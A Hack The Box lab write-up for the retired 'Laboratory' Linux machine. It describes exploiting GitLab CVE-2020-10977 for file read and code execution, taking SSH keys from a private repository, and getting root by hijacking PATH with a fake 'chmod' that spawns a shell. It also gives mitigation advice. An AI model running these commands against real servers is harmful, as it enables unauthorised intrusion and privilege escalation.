---
machine: Laboratory
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, gitlab, cve-2020-10977, suid, path-hijack]
---

# Laboratory — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

GitLab is vulnerable to CVE-2020-10977: arbitrary file read chained with project creation for code execution. A private repository provides SSH credentials; a SUID `docker-security` calls `chmod` without an absolute path, allowing PATH hijacking.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443 <IP>
curl -s http://laboratory.htb/help | grep -i version
# CVE-2020-10977: file read and RCE
python3 gitlab_exploit.py -u http://laboratory.htb -t <TOKEN>
# After access
find / -perm -4000 -type f 2>/dev/null
mkdir -p /tmp/bin && printf '#!/bin/sh\n/bin/sh\n' > /tmp/bin/chmod && chmod +x /tmp/bin/chmod
PATH=/tmp/bin:$PATH /usr/local/bin/docker-security
```

## Enumeration

- GitLab older than 12.9.0 with open registration.
- Private repository with secrets and an SSH key.
- SUID `docker-security` binary that runs `chmod` without an absolute path.

## Initial access

Exploit GitLab arbitrary file read and chain it with project creation for RCE in the container. Recover credentials and a key from the private repository to SSH into the host.

## Privilege escalation

`find / -perm -4000` shows `docker-security`. The binary calls `chmod` without an absolute path; place a fake `chmod` at the front of `PATH` and run it as root.

## Evidence

- GitLab file read and container execution.
- SSH key from the private repository.
- `docker-security` with manipulated `PATH` and root shell.

## Lessons learned

- Arbitrary file read can become RCE by chaining features.
- Private repositories often contain operational secrets.
- A SUID calling commands without absolute paths is PATH hijacking.

## Mitigation and detection

- Update GitLab and restrict registration.
- Do not store SSH keys in repositories; use ephemeral credentials.
- Use absolute paths in SUID binaries and review capabilities.

## References

- [0xdf — Laboratory](https://0xdf.gitlab.io/2021/04/17/htb-laboratory.html)
- [NVD — CVE-2020-10977](https://nvd.nist.gov/vuln/detail/CVE-2020-10977)
- [Hack The Box — Laboratory](https://app.hackthebox.com/machines/laboratory)
